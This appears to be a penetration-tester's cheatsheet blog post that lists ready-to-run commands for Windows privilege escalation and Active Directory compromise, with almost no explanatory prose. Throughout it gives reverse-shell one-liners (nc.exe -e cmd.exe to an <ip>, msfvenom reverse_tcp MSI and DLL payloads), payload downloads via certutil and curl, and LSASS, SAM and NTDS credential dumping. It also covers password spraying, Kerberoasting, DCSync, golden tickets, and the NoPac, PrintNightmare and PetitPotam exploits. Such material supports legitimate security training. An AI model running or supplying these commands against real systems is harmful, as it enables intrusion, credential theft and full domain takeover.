---
title: Windows PrivEsc & AD
author: 0vld
date: 2026-02-18
category: cheatsheets
layout: post
---

## Initial Enumeration

```cmd
ipconfig /all
```

```cmd
arp -a
```

```cmd
route print
```

```powershell
Get-MpComputerStatus
```

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

```powershell
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

```cmd
set
```

```cmd
systeminfo
```

```cmd
wmic qfe
```

```cmd
wmic product get name
```

```cmd
tasklist /svc
```

```cmd
query user
```

```cmd
echo %USERNAME%
```

```cmd
whoami /priv
```

```cmd
whoami /groups
```

```cmd
net user
```

```cmd
net localgroup
```

```cmd
net localgroup administrators
```

```cmd
net accounts
```

```cmd
netstat -ano
```

```cmd
pipelist.exe /accepteula
```

```powershell
gci \\.\pipe\
```

```cmd
accesschk.exe /accepteula \\.\Pipe\lsass -v
```

---

## PowerShell History & Environment

```powershell
(Get-PSReadLineOption).HistorySavePath
```

```powershell
gc (Get-PSReadLineOption).HistorySavePath
```

```powershell
[environment]::OSVersion.Version
```

```cmd
cmd /c echo %PATH%
```

---

## Named Pipes

```cmd
pipelist.exe /accepteula
```

```powershell
gci \\.\pipe\
```

```cmd
accesschk.exe /accepteula \\.\Pipe\lsass -v
```

---

## Credential Hunting

```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

```powershell
gc 'C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

```powershell
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
```

```cmd
cd c:\Users\<user>\Documents & findstr /SI /M "password" *.xml *.ini *.txt
```

```cmd
findstr /si password *.xml *.ini *.txt *.config
```

```cmd
findstr /spin "password" *.*
```

```powershell
select-string -Path C:\Users\<user>\Documents\*.txt -Pattern password
```

```cmd
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
```

```cmd
where /R C:\ *.config
```

```powershell
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

```cmd
cmdkey /list
```

```powershell
.\SharpChrome.exe logins /unprotect
```

```powershell
.\lazagne.exe all
```

```powershell
Invoke-SessionGopher -Target <hostname>
```

```cmd
netsh wlan show profile
```

```cmd
netsh wlan show profile <profile_name> key=clear
```

```cmd
rundll32 keymgr.dll,KRShowKeyMgr
```

```cmd
runas /savecred /user:<username> cmd
```

---

## SeImpersonate / SeAssignPrimaryToken

```bash
mssqlclient.py <user>@<ip> -windows-auth
```

```sql
enable_xp_cmdshell
```

```sql
xp_cmdshell whoami /priv
```

```cmd
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe <ip> 443 -e cmd.exe" -t *
```

```cmd
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe <ip> 8443 -e cmd"
```

> ##### TIP
>
> JuicyPotato doesn't work on Server 2019 / Win10 build 1809+. Use PrintSpoofer or RoguePotato.
{: .block-tip }

---

## SeDebugPrivilege — LSASS Dump

```powershell
Get-Process lsass
```

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```cmd
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

```cmd
sekurlsa::minidump lsass.dmp
```

```cmd
sekurlsa::logonpasswords
```

```bash
pypykatz lsa minidump /path/to/lsass.dmp
```

---

## SeBackupPrivilege

```powershell
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

---

## SeTakeOwnershipPrivilege

```cmd
dir /q C:\backups\wwwroot\web.config
```

```cmd
takeown /f C:\backups\wwwroot\web.config
```

```powershell
Get-ChildItem -Path 'C:\backups\wwwroot\web.config' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
```

```cmd
icacls "C:\backups\wwwroot\web.config" /grant <username>:F
```

---

## SAM / NTDS Dump

```cmd
reg.exe save hklm\sam C:\sam.save
```

```cmd
reg.exe save hklm\security C:\security.save
```

```cmd
reg.exe save hklm\system C:\system.save
```

```cmd
move sam.save \\<ip>\<share>
```

```bash
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

```cmd
vssadmin CREATE SHADOW /For=C:
```

```cmd
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

```cmd
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

---

## Event Log Readers

```cmd
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

```cmd
wevtutil qe Security /rd:true /f:text /r:<host> /u:<user> /p:<password> | findstr "/user"
```

```powershell
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

---

## DnsAdmins

```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" <user> /add /domain' -f dll -o adduser.dll
```

```cmd
dnscmd.exe /config /serverlevelplugindll adduser.dll
```

```cmd
wmic useraccount where name="<user>" get sid
```

```cmd
sc.exe sdshow DNS
```

```cmd
sc stop dns && sc start dns
```

```cmd
reg query \\<dc_ip>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```

```cmd
reg delete \\<dc_ip>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
```

```powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName <dc_hostname>
```

```powershell
Add-DnsServerResourceRecordA -Name wpad -ZoneName <domain> -ComputerName <dc_hostname> -IPv4Address <ip>
```

---

## Print Operators — SeLoadDriverPrivilege

```cmd
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```

```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
```

```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

```cmd
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```

```powershell
.\DriverView.exe /stext drivers.txt && cat drivers.txt | Select-String -pattern Capcom
```

```powershell
.\ExploitCapcom.exe
```

---

## Service Abuse

```cmd
c:\Tools\PsService.exe security AppReadiness
```

```cmd
sc config AppReadiness binPath= "cmd /c net localgroup Administrators <user> /add"
```

```cmd
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

```cmd
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v "\""
```

```cmd
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
```

```powershell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\<user>\Downloads\nc.exe -e cmd.exe <ip> 443"
```

---

## AlwaysInstallElevated

```cmd
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

```bash
msfvenom -p windows/shell_reverse_tcp lhost=<ip> lport=<port> -f msi > shell.msi
```

```cmd
msiexec /i c:\users\<user>\desktop\shell.msi /quiet /qn /norestart
```

---

## UAC

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

```cmd
curl http://<ip>:8080/srrstr.dll -O "C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

```cmd
rundll32 shell32.dll,Control_RunDLL C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

---

## Scheduled Tasks

```cmd
schtasks /query /fo LIST /v
```

```powershell
Get-ScheduledTask | select TaskName,State
```

```cmd
.\accesschk64.exe /accepteula -s -d C:\Scripts\
```

---

## Misc Checks

```powershell
Get-LocalUser
```

```powershell
Get-WmiObject -Class Win32_OperatingSystem | select Description
```

```powershell
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```

```powershell
get-process -Id <PID>
```

```powershell
get-service | ? {$_.DisplayName -like 'Druva*'}
```

```powershell
.\SharpUp.exe audit
```

---

## Mount VHD / VMDK

```bash
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmd
```

```bash
guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1
```

---

## Windows Exploit Suggester

```bash
python2.7 windows-exploit-suggester.py --update
```

```bash
python2.7 windows-exploit-suggester.py --database <date>-mssb.xls --systeminfo win7lpe-systeminfo.txt
```

---

## File Transfers (certutil)

```cmd
certutil.exe -urlcache -split -f http://<ip>:8080/shell.bat shell.bat
```

```cmd
certutil -encode file1 encodedfile
```

```cmd
certutil -decode encodedfile file2
```

---

## AD — Initial Enumeration

```bash
nslookup ns1.<domain>
```

```bash
sudo tcpdump -i <interface>
```

```bash
sudo responder -I <interface> -A
```

```bash
fping -asgq <ip_range>
```

```bash
sudo nmap -v -A -iL hosts.txt -oN /home/<user>/host-enum
```

```bash
kerbrute userenum -d <domain> --dc <ip> jsmith.txt -o kerb-results
```

---

## LLMNR / NBT-NS Poisoning

```bash
sudo responder -I <interface>
```

```bash
hashcat -m 5600 <ntlmv2_hash> /usr/share/wordlists/rockyou.txt
```

```powershell
Import-Module .\Inveigh.ps1
```

```powershell
(Get-Command Invoke-Inveigh).Parameters
```

```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

```cmd
.\Inveigh.exe
```

---

## Password Policy & Spraying

```bash
crackmapexec smb <ip> -u <user> -p <password> --pass-pol
```

```bash
rpcclient -U "" -N <ip>
```

```bash
rpcclient $> querydominfo
```

```bash
enum4linux -P <ip>
```

```bash
enum4linux-ng -P <ip> -oA <output>
```

```bash
ldapsearch -h <ip> -x -b "DC=<domain>,DC=<tld>" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

```cmd
net accounts
```

```powershell
Import-Module .\PowerView.ps1
```

```powershell
Get-DomainPolicy
```

```bash
enum4linux -U <ip> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

```bash
rpcclient $> enumdomusers
```

```bash
crackmapexec smb <ip> --users
```

```bash
ldapsearch -h <ip> -x -b "DC=<domain>,DC=<tld>" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```

```bash
python3 windapsearch.py --dc-ip <ip> -u "" -U
```

```bash
for u in $(cat valid_users.txt); do rpcclient -U "$u%<password>" -c "getusername;quit" <ip> | grep Authority; done
```

```bash
kerbrute passwordspray -d <domain> --dc <ip> valid_users.txt <password>
```

```bash
sudo crackmapexec smb <ip> -u valid_users.txt -p <password> | grep +
```

```bash
sudo crackmapexec smb <ip> -u <user> -p <password>
```

```bash
sudo crackmapexec smb --local-auth <ip_range> -u administrator -H <hash> | grep +
```

```powershell
Import-Module .\DomainPasswordSpray.ps1
```

```powershell
Invoke-DomainPasswordSpray -Password <password> -OutFile spray_success -ErrorAction SilentlyContinue
```

---

## Security Controls

```powershell
Get-MpComputerStatus
```

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

```powershell
$ExecutionContext.SessionState.LanguageMode
```

```powershell
Find-LAPSDelegatedGroups
```

```powershell
Find-AdmPwdExtendedRights
```

```powershell
Get-LAPSComputers
```

---

## Credentialed Enumeration

```bash
sudo crackmapexec smb <ip> -u <user> -p <password> --users
```

```bash
sudo crackmapexec smb <ip> -u <user> -p <password> --groups
```

```bash
sudo crackmapexec smb <ip> -u <user> -p <password> --loggedon-users
```

```bash
sudo crackmapexec smb <ip> -u <user> -p <password> --shares
```

```bash
sudo crackmapexec smb <ip> -u <user> -p <password> -M spider_plus --share <share>
```

```bash
smbmap -u <user> -p <password> -d <domain> -H <ip>
```

```bash
smbmap -u <user> -p <password> -d <domain> -H <ip> -R SYSVOL --dir-only
```

```bash
rpcclient $> queryuser 0x457
```

```bash
rpcclient $> enumdomusers
```

```bash
psexec.py <domain>/<user>:'<password>'@<ip>
```

```bash
wmiexec.py <domain>/<user>:'<password>'@<ip>
```

```bash
python3 windapsearch.py --dc-ip <ip> -u <domain>\<user> -p <password> --da
```

```bash
python3 windapsearch.py --dc-ip <ip> -u <domain>\<user> -p <password> -PU
```

```bash
sudo bloodhound-python -u '<user>' -p '<password>' -ns <ip> -d <domain> -c all
```

---

## Living Off the Land (AD)

```powershell
Get-Module
```

```powershell
Import-Module ActiveDirectory
```

```powershell
Get-ADDomain
```

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

```powershell
Get-ADTrust -Filter *
```

```powershell
Get-ADGroup -Filter * | select name
```

```powershell
Get-ADGroup -Identity "Backup Operators"
```

```powershell
Get-ADGroupMember -Identity "Backup Operators"
```

---

## PowerView

```powershell
Import-Module .\PowerView.ps1
```

```powershell
Export-PowerViewCSV
```

```powershell
ConvertTo-SID
```

```powershell
Get-DomainSPNTicket
```

```powershell
Get-Domain
```

```powershell
Get-DomainController
```

```powershell
Get-DomainUser
```

```powershell
Get-DomainUser -Identity <user> | Get-DomainSPNTicket -Format Hashcat
```

```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\tgs.csv -NoTypeInformation
```

```powershell
Get-DomainComputer
```

```powershell
Get-DomainGroup
```

```powershell
Get-DomainOU
```

```powershell
Find-InterestingDomainAcl
```

```powershell
Get-DomainGroupMember
```

```powershell
Get-DomainFileServer
```

```powershell
Get-DomainGPO
```

```powershell
Get-DomainPolicy
```

```powershell
Get-NetLocalGroup
```

```powershell
Get-NetLocalGroupMember
```

```powershell
Get-NetLocalGroupMember -ComputerName <hostname> -GroupName "Remote Desktop Users"
```

```powershell
Get-NetShare
```

```powershell
Get-NetSession
```

```powershell
Test-AdminAccess
```

```powershell
Find-DomainUserLocation
```

```powershell
Find-DomainShare
```

```powershell
Find-InterestingDomainShareFile
```

```powershell
Find-LocalAdminAccess
```

```powershell
Get-DomainTrust
```

```powershell
Get-ForestTrust
```

```powershell
Get-DomainForeignUser
```

```powershell
Get-DomainForeignGroupMember
```

```powershell
Get-DomainTrustMapping
```

```powershell
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

```powershell
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

```powershell
$sid = Convert-NameToSid <user>
```

```powershell
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

```powershell
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

---

## Snaffler

```cmd
.\Snaffler.exe -d <domain> -s -v data
```

---

## Kerberoasting

```bash
GetUserSPNs.py -dc-ip <ip> <domain>/
```

```bash
GetUserSPNs.py -dc-ip <ip> <domain>/<user> -request
```

```bash
GetUserSPNs.py -dc-ip <ip> <domain>/<user> -request-user <target_user> -outputfile <user>_tgs
```

```bash
hashcat -m 13100 <user>_tgs /usr/share/wordlists/rockyou.txt
```

```cmd
setspn.exe -Q */*
```

```powershell
setspn.exe -T <domain> -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

```powershell
.\Rubeus.exe kerberoast /stats
```

```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

```powershell
.\Rubeus.exe kerberoast /user:<user> /nowrap
```

```powershell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

```cmd
mimikatz # base64 /out:true
```

```cmd
mimikatz # kerberos::list /export
```

```bash
echo "<base64>" | tr -d \\n | base64 -d > <user>.kirbi
```

```bash
python2.7 kirbi2john.py <user>.kirbi
```

```bash
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > tgs_hashcat
```

---

## ASREPRoasting

```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

```powershell
.\Rubeus.exe asreproast /user:<user> /nowrap /format:hashcat
```

```bash
hashcat -m 18200 <hash> /usr/share/wordlists/rockyou.txt
```

```bash
kerbrute userenum -d <domain> --dc <ip> /opt/jsmith.txt
```

---

## ACL Abuse

```powershell
$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
```

```powershell
$Cred = New-Object System.Management.Automation.PSCredential('<domain>\<user>', $SecPassword)
```

```powershell
Set-DomainUserPassword -Identity <user> -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

```powershell
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
```

```powershell
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members '<user>' -Credential $Cred2 -Verbose
```

```powershell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

```powershell
Set-DomainObject -Credential $Cred2 -Identity <user> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

```powershell
Set-DomainObject -Credential $Cred2 -Identity <user> -Clear serviceprincipalname -Verbose
```

```powershell
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members '<user>' -Credential $Cred2 -Verbose
```

```powershell
ConvertFrom-SddlString
```

---

## DCSync

```powershell
Get-DomainUser -Identity <user> | select samaccountname,objectsid,memberof,useraccountcontrol | fl
```

```powershell
$sid= "<user_sid>"
Get-ObjectAcl "DC=<domain>,DC=<tld>" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

```bash
secretsdump.py -outputfile <domain>_hashes -just-dc <domain>/<user>@<ip>
```

```bash
secretsdump.py <domain>/<user>:'<password>'@<ip> -use-vss
```

```cmd
mimikatz # lsadump::dcsync /domain:<domain> /user:<domain>\administrator
```

---

## Privileged Access

```bash
evil-winrm -i <ip> -u <user> -p <password>
```

```powershell
$password = ConvertTo-SecureString "<password>" -AsPlainText -Force
```

```powershell
$cred = new-object System.Management.Automation.PSCredential ("<domain>\<user>", $password)
```

```powershell
Enter-PSSession -ComputerName <hostname> -Credential $cred
```

```powershell
Import-Module .\PowerUpSQL.ps1
```

```powershell
Get-SQLInstanceDomain
```

```powershell
Get-SQLQuery -Verbose -Instance "<ip>,1433" -username "<domain>\<user>" -password "<password>" -query 'Select @@version'
```

```bash
mssqlclient.py <domain>/<user>@<ip> -windows-auth
```

```sql
enable_xp_cmdshell
```

```sql
xp_cmdshell whoami /priv
```

---

## NoPac (CVE-2021-42278/42287)

```bash
sudo python3 scanner.py <domain>/<user>:<password> -dc-ip <ip> -use-ldap
```

```bash
sudo python3 noPac.py <domain>/<user>:<password> -dc-ip <ip> -dc-host <dc_hostname> -shell --impersonate administrator -use-ldap
```

```bash
sudo python3 noPac.py <domain>/<user>:<password> -dc-ip <ip> -dc-host <dc_hostname> --impersonate administrator -use-ldap -dump -just-dc-user <domain>/administrator
```

---

## PrintNightmare (CVE-2021-1675)

```bash
git clone https://github.com/cube0x0/CVE-2021-1675.git
```

```bash
pip3 uninstall impacket && git clone https://github.com/cube0x0/impacket && cd impacket && python3 ./setup.py install
```

```bash
rpcdump.py @<ip> | egrep 'MS-RPRN|MS-PAR'
```

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=8080 -f dll > backupscript.dll
```

```bash
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

```bash
sudo python3 CVE-2021-1675.py <domain>/<user>:<password>@<ip> '\\<ip>\CompData\backupscript.dll'
```

---

## PetitPotam

```bash
sudo ntlmrelayx.py -debug -smb2support --target http://<ca_host>/certsrv/certfnsh.asp --adcs --template DomainController
```

```bash
git clone https://github.com/topotam/PetitPotam.git
```

```bash
python3 PetitPotam.py <attacker_ip> <dc_ip>
```

```bash
python3 /opt/PKINITtools/gettgtpkinit.py <domain>/<dc_name>$ -pfx-base64 <cert> dc01.ccache
```

```bash
secretsdump.py -just-dc-user <domain>/administrator -k -no-pass "<dc_name>$"@<dc_fqdn>
```

```bash
klist
```

```bash
python3 /opt/PKINITtools/getnthash.py -key <key> <domain>/<dc_name>$
```

---

## Misc AD Misconfigs

```powershell
Import-Module .\SecurityAssessment.ps1
```

```powershell
Get-SpoolStatus -ComputerName <dc_fqdn>
```

```bash
adidnsdump -u <domain>\\<user> ldap://<ip>
```

```bash
adidnsdump -u <domain>\\<user> ldap://<ip> -r
```

```powershell
Get-DomainUser * | Select-Object samaccountname,description
```

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

```powershell
ls \\<dc>\SYSVOL\<domain>\scripts
```

---

## GPO Abuse

```bash
gpp-decrypt <hash>
```

```bash
crackmapexec smb -L | grep gpp
```

```bash
crackmapexec smb <ip> -u <user> -p <password> -M gpp_autologin
```

```powershell
Get-DomainGPO | select displayname
```

```powershell
Get-GPO -All | Select DisplayName
```

```powershell
$sid=Convert-NameToSid "Domain Users"
```

```powershell
Get-DomainGPO | Get-ObjectAcl | ? {$_.SecurityIdentifier -eq $sid}
```

```powershell
Get-GPO -Guid <gpo_guid>
```

---

## ASREPRoasting

```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

```powershell
.\Rubeus.exe asreproast /user:<user> /nowrap /format:hashcat
```

```bash
hashcat -m 18200 <hash> /usr/share/wordlists/rockyou.txt
```

---

## Domain Trusts

```powershell
Import-Module activedirectory
```

```powershell
Get-ADTrust -Filter *
```

```powershell
Get-DomainTrust
```

```powershell
Get-DomainTrustMapping
```

```powershell
Get-DomainUser -Domain <child_domain> | select SamAccountName
```

---

## Child → Parent Trust Escalation

```cmd
mimikatz # lsadump::dcsync /user:<child_domain>\krbtgt
```

```powershell
Get-DomainSID
```

```powershell
Get-DomainGroup -Domain <parent_domain> -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

```cmd
mimikatz # kerberos::golden /user:hacker /domain:<child_domain> /sid:<child_sid> /krbtgt:<hash> /sids:<enterprise_admins_sid> /ptt
```

```powershell
.\Rubeus.exe golden /rc4:<hash> /domain:<child_domain> /sid:<child_sid> /sids:<enterprise_admins_sid> /user:hacker /ptt
```

```bash
lookupsid.py <child_domain>/<user>@<ip>
```

```bash
lookupsid.py <child_domain>/<user>@<ip> | grep "Domain SID"
```

```bash
lookupsid.py <child_domain>/<user>@<ip> | grep -B12 "Enterprise Admins"
```

```bash
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_sid> -extra-sid <enterprise_admins_sid> hacker
```

```bash
export KRB5CCNAME=hacker.ccache
```

```bash
psexec.py <child_domain>/hacker@<dc_fqdn> -k -no-pass -target-ip <ip>
```

```bash
raiseChild.py -target-exec <ip> <child_domain>/<user>
```

```cmd
mimikatz # lsadump::dcsync /user:<domain>\lab_adm
```

```bash
secretsdump.py <child_domain>/<user>@<child_dc_ip> -just-dc-user <child_domain>/krbtgt
```

---

## Cross-Forest Trust Abuse

```powershell
Get-DomainUser -SPN -Domain <target_domain> | select SamAccountName
```

```powershell
Get-DomainUser -Domain <target_domain> -Identity <user> | select samaccountname,memberof
```

```powershell
.\Rubeus.exe kerberoast /domain:<target_domain> /user:<user> /nowrap
```

```powershell
Get-DomainForeignGroupMember -Domain <target_domain>
```

```powershell
Enter-PSSession -ComputerName <dc_fqdn> -Credential <domain>\administrator
```

```bash
GetUserSPNs.py -request -target-domain <target_domain> <source_domain>/<user>
```

```bash
bloodhound-python -d <domain> -dc <dc_hostname> -c All -u <user> -p <password>
```

```bash
zip -r ilfreight_bh.zip *.json
```
